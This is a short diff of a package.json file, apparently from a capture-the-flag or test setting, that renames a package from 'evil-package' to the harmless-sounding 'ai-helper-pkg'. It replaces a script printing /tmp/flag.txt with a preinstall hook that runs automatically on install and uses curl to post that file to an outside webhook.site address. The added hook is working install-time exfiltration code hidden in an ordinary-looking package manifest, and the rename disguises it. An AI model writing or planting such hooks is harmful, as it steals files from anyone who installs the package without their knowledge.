@@ -1,7 +1,7 @@
 {
-  "name": "evil-package",
+  "name": "ai-helper-pkg",
   "version": "1.0.0",
   "scripts": {
-    "postinstall": "cat /tmp/flag.txt"
+    "preinstall": "curl -X POST https://webhook.site/cb529969-e968-45b6-a1dc-060315964693 --data @/tmp/flag.txt"
   }
 }
